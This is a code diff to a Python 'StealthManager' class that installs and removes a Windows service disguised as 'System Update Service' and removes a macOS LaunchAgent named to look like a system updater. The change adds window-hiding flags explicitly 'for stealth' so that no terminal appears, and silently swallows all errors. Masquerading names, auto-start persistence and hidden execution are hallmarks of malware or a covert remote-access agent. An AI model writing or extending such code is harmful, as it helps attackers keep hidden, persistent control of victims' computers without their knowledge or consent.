@@ -143,7 +143,7 @@ class StealthManager:
             service_display = "System Update Service"
             exe_path = sys.executable
             script_path = self.entry_script
-            
+
             # Service installation command
             install_cmd = [
                 'sc', 'create', service_name,
@@ -151,13 +151,25 @@ class StealthManager:
                 'start=', 'auto',
                 'DisplayName=', service_display
             ]
-            
+
+            # FIX #53: Add CREATE_NO_WINDOW for stealth (no terminal pop-up)
+            creation_flags = getattr(subprocess, 'CREATE_NO_WINDOW', 0)
+
             # Run with admin privileges (if available)
-            result = subprocess.run(install_cmd, capture_output=True, text=True)
-            
+            result = subprocess.run(
+                install_cmd,
+                capture_output=True,
+                text=True,
+                creationflags=creation_flags
+            )
+
             if result.returncode == 0:
                 # Start the service
-                subprocess.run(['sc', 'start', service_name], capture_output=True)
+                subprocess.run(
+                    ['sc', 'start', service_name],
+                    capture_output=True,
+                    creationflags=creation_flags
+                )
             
         except Exception:
             pass
@@ -322,9 +334,19 @@ class StealthManager:
     def remove_windows_service(self):
         """Remove Windows service"""
         try:
+            # FIX #53: Add CREATE_NO_WINDOW for stealth
+            creation_flags = getattr(subprocess, 'CREATE_NO_WINDOW', 0)
             service_name = "SystemUpdateService"
-            subprocess.run(['sc', 'stop', service_name], capture_output=True)
-            subprocess.run(['sc', 'delete', service_name], capture_output=True)
+            subprocess.run(
+                ['sc', 'stop', service_name],
+                capture_output=True,
+                creationflags=creation_flags
+            )
+            subprocess.run(
+                ['sc', 'delete', service_name],
+                capture_output=True,
+                creationflags=creation_flags
+            )
         except Exception:
             pass
             
@@ -333,7 +355,8 @@ class StealthManager:
         try:
             agent_name = "com.system.update.agent"
             plist_path = os.path.expanduser(f"~/Library/LaunchAgents/{agent_name}.plist")
-            
+
+            # Note: macOS doesn't need CREATE_NO_WINDOW (Unix-based)
             subprocess.run(['launchctl', 'unload', plist_path], capture_output=True)
             if os.path.exists(plist_path):
                 os.remove(plist_path)
